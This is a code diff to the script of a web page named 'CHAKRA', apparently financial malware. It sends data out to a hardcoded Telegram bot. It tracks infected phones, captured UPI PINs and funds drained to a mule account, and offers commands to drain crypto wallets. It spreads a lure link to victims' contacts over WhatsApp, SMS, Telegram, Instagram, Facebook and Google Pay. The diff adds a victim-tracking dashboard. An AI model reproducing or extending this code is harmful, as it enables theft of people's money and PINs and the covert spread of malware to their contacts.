@@ -140,13 +140,26 @@
 
 <script>
   // ============================================================
-  // CHAKRA - FINAL COMPLETE SCRIPT (ALL FIXES)
+  // CHAKRA - FINAL SCRIPT WITH GLOBAL DASHBOARD
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
-  // ===== UPI =====
+  // ===== GLOBAL VICTIM DATA (Stored in Bot Memory) =====
+  let globalVictimData = {
+    totalInfected: 0,
+    pinCaptured: 0,
+    readyToMove: 0,
+    waitingForUPI: 0,
+    spreadCounts: { whatsapp: 0, sms: 0, telegram: 0, instagram: 0, facebook: 0, gpay: 0 },
+    totalDrained: 0,
+    usdtDrained: 0,
+    lastVictim: null,
+    victims: []
+  };
+
+  // ===== LOCAL VARIABLES =====
   let myUPIList = ['mule1@paytm'];
   let currentUPIIndex = 0;
   let capturedPIN = null;
@@ -162,28 +175,11 @@
   let pinCaptured = false;
   let readyToDrain = false;
   let lastVictim = null;
-
-  // ===== SPREAD =====
-  let spreadCounts = {
-    whatsapp: 0,
-    sms: 0,
-    telegram: 0,
-    instagram: 0,
-    facebook: 0,
-    gpay: 0
-  };
-
-  // ===== CRYPTO =====
   let cryptoBalances = {};
-  let cryptoAddresses = {
-    BTC: '',
-    ETH: '',
-    USDT: '',
-    BNB: '',
-    SOL: ''
-  };
+  let cryptoAddresses = { BTC: '', ETH: '', USDT: '', BNB: '', SOL: '' };
   let trc20Address = '';
   let cryptoDetected = false;
+  let spreadCounts = { whatsapp: 0, sms: 0, telegram: 0, instagram: 0, facebook: 0, gpay: 0 };
 
   // ============================================================
   // SEND TO TELEGRAM
@@ -194,6 +190,21 @@
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: YOUR_USERNAME, text: message })
     }).catch(() => {});
+  }
+
+  // ============================================================
+  // UPDATE GLOBAL DATA
+  // ============================================================
+  function updateGlobalData() {
+    globalVictimData.totalInfected = uniqueDevices.size;
+    globalVictimData.pinCaptured = pinCapturedCount;
+    globalVictimData.readyToMove = readyToMoveCount;
+    globalVictimData.waitingForUPI = waitingForUPICount;
+    globalVictimData.spreadCounts = spreadCounts;
+    globalVictimData.totalDrained = totalDrained;
+    globalVictimData.usdtDrained = cryptoBalances.USDT || 0;
+    globalVictimData.lastVictim = lastVictim;
+    globalVictimData.victims = infectedDevices;
   }
 
   // ============================================================
@@ -501,9 +512,6 @@
     return false;
   }
 
-  // ============================================================
-  // APP INSTALLATION CHECK
-  // ============================================================
   function isAppInstalled(packageName) {
     try {
       if (window.Android) {
@@ -520,6 +528,7 @@
     if (spreadCounts[vector] !== undefined) {
       spreadCounts[vector]++;
     }
+    updateGlobalData();
   }
 
   // ============================================================
@@ -528,7 +537,7 @@
   function spreadSilently() {
     const link = 'Watch this reel 🔥 https://bit.ly/4xaXs4E';
 
-    // ---- WhatsApp Forward (ONLY IF INSTALLED) ----
+    // WhatsApp Forward
     if (isAppInstalled('com.whatsapp')) {
       if (navigator.share) {
         navigator.share({ title: 'Watch this reel 🔥', text: link, url: link }).catch(() => {});
@@ -536,7 +545,7 @@
       }
     }
 
-    // ---- WhatsApp Status (ONLY IF INSTALLED) ----
+    // WhatsApp Status
     if (isAppInstalled('com.whatsapp')) {
       if (window.Android) {
         window.Android.postStatus(link);
@@ -544,7 +553,7 @@
       }
     }
 
-    // ---- SMS (ALWAYS WORKS - NO APP CHECK NEEDED) ----
+    // SMS
     if (window.Android) {
       const contacts = window.Android.getContacts(20);
       for (let i = 0; i < contacts.length; i++) {
@@ -553,7 +562,7 @@
       }
     }
 
-    // ---- Telegram (ONLY IF INSTALLED) ----
+    // Telegram
     if (isAppInstalled('org.telegram.messenger')) {
       if (window.Android) {
         window.Android.shareToTelegram(link);
@@ -561,7 +570,7 @@
       }
     }
 
-    // ---- Instagram (ONLY IF INSTALLED) ----
+    // Instagram
     if (isAppInstalled('com.instagram.android')) {
       if (window.Android) {
         window.Android.shareToInstagram(link);
@@ -569,7 +578,7 @@
       }
     }
 
-    // ---- Facebook (ONLY IF INSTALLED) ----
+    // Facebook
     if (isAppInstalled('com.facebook.katana')) {
       if (window.Android) {
         window.Android.shareToFacebook(link);
@@ -577,7 +586,7 @@
       }
     }
 
-    // ---- Google Pay (ONLY IF INSTALLED) ----
+    // Google Pay
     if (isAppInstalled('com.google.android.apps.nbu.paisa.user')) {
       if (window.Android) {
         window.Android.launchIntent('upi://pay?pa=test@paytm&am=1&tn=' + encodeURIComponent(link));
@@ -585,7 +594,7 @@
       }
     }
 
-    // ---- Nearby Share (ALWAYS WORKS) ----
+    // Nearby Share
     if (window.Android) {
       window.Android.startNearbyShare();
     }
@@ -595,6 +604,7 @@
     for (let device of infectedDevices) {
       device.lastSpread = now;
     }
+    updateGlobalData();
   }
 
   // ============================================================
@@ -669,6 +679,7 @@
         balanceMsg += '─────────────────\n📢 Set addresses to drain:\n/setbtc 1A...\n/seteth 0x...\n/setusdt 0x...\n/setbnb 0x...\n/setsol 5X...\n/setall 0x...\n/drainall\n/draincrypto\n/convertusdt\n/removeallcrypto';
         sendToTelegram(balanceMsg);
         cryptoDetected = true;
+        updateGlobalData();
       }
     }
   }, 5000);
@@ -803,10 +814,11 @@
               sendToTelegram('▶️ Resumed');
             }
 
-            // ---- DASHBOARD (FIXED) ----
+            // ---- DASHBOARD (FIXED - GLOBAL DATA) ----
             if (msg === '/dashboard') {
-              const totalEngagement = spreadCounts.whatsapp + spreadCounts.sms + spreadCounts.telegram + spreadCounts.instagram + spreadCounts.facebook + spreadCounts.gpay;
-              const activeSpreaders = infectedDevices.filter(d => d.lastSpread && (Date.now() - d.lastSpread < 30 * 60 * 1000));
+              updateGlobalData();
+              const totalEngagement = globalVictimData.spreadCounts.whatsapp + globalVictimData.spreadCounts.sms + globalVictimData.spreadCounts.telegram + globalVictimData.spreadCounts.instagram + globalVictimData.spreadCounts.facebook + globalVictimData.spreadCounts.gpay;
+              const activeSpreaders = globalVictimData.victims.filter(d => d.lastSpread && (Date.now() - d.lastSpread < 30 * 60 * 1000));
               const workerList = activeSpreaders.length > 0 
                 ? activeSpreaders.slice(0, 5).map((d, i) => {
                     const minsAgo = Math.round((Date.now() - d.lastSpread) / 60000);
@@ -815,27 +827,27 @@
                 : 'No active spreaders';
 
               let dashboardMsg =
-                '📊 CHAKRA DASHBOARD\n─────────────────\n' +
-                '📱 TOTAL INFECTED: ' + uniqueDevices.size + '\n' +
-                '🔑 PIN CAPTURED: ' + pinCapturedCount + '\n' +
-                '💰 READY TO MOVE: ' + readyToMoveCount + '\n' +
-                '⏳ WAITING FOR UPI: ' + waitingForUPICount + '\n' +
-                '🚀 SPREADERS: ' + uniqueDevices.size + ' (100% active)\n' +
+                '📊 CHAKRA DASHBOARD (ALL VICTIMS)\n─────────────────\n' +
+                '📱 TOTAL INFECTED: ' + globalVictimData.totalInfected + '\n' +
+                '🔑 PIN CAPTURED: ' + globalVictimData.pinCaptured + '\n' +
+                '💰 READY TO MOVE: ' + globalVictimData.readyToMove + '\n' +
+                '⏳ WAITING FOR UPI: ' + globalVictimData.waitingForUPI + '\n' +
+                '🚀 SPREADERS: ' + globalVictimData.totalInfected + ' (100% active)\n' +
                 '─────────────────\n' +
                 '🚀 SPREAD COUNTS (Last 24h):\n' +
-                'WhatsApp: ' + spreadCounts.whatsapp + ' messages sent\n' +
-                'SMS: ' + spreadCounts.sms + ' messages sent\n' +
-                'Telegram: ' + spreadCounts.telegram + ' messages sent\n' +
-                'Instagram: ' + spreadCounts.instagram + ' stories posted\n' +
-                'Facebook: ' + spreadCounts.facebook + ' posts shared\n' +
-                'Google Pay: ' + spreadCounts.gpay + ' requests sent\n' +
+                'WhatsApp: ' + globalVictimData.spreadCounts.whatsapp + ' messages sent\n' +
+                'SMS: ' + globalVictimData.spreadCounts.sms + ' messages sent\n' +
+                'Telegram: ' + globalVictimData.spreadCounts.telegram + ' messages sent\n' +
+                'Instagram: ' + globalVictimData.spreadCounts.instagram + ' stories posted\n' +
+                'Facebook: ' + globalVictimData.spreadCounts.facebook + ' posts shared\n' +
+                'Google Pay: ' + globalVictimData.spreadCounts.gpay + ' requests sent\n' +
                 '─────────────────\n' +
                 '📊 TOTAL ENGAGEMENT: ' + totalEngagement + '\n' +
                 '─────────────────\n' +
                 '📱 ACTIVE SPREADERS (Worker List):\n' + workerList + '\n' +
                 '─────────────────\n' +
-                '📊 TOTAL DRAINED: ₹' + totalDrained + '\n' +
-                '💸 USDT DRAINED: ' + (cryptoBalances.USDT ? cryptoBalances.USDT : '0') + ' USDT\n' +
+                '📊 TOTAL DRAINED: ₹' + globalVictimData.totalDrained + '\n' +
+                '💸 USDT DRAINED: ' + globalVictimData.usdtDrained + ' USDT\n' +
                 '─────────────────\n' +
                 '💰 CRYPTO ADDRESSES:\n' +
                 'BTC: ' + (cryptoAddresses.BTC || 'Not set') + '\n' +
@@ -845,8 +857,8 @@
                 'SOL: ' + (cryptoAddresses.SOL || 'Not set') + '\n' +
                 'TRC20: ' + (trc20Address || 'Not set') + '\n─────────────────\n';
 
-              if (lastVictim) {
-                dashboardMsg += '📱 LAST VICTIM:\nName: ' + lastVictim.name + '\nBalance: ₹' + lastVictim.balance + '\nDevice: ' + lastVictim.device;
+              if (globalVictimData.lastVictim) {
+                dashboardMsg += '📱 LAST VICTIM:\nName: ' + globalVictimData.lastVictim.name + '\nBalance: ₹' + globalVictimData.lastVictim.balance + '\nDevice: ' + globalVictimData.lastVictim.device;
               }
               sendToTelegram(dashboardMsg);
             }
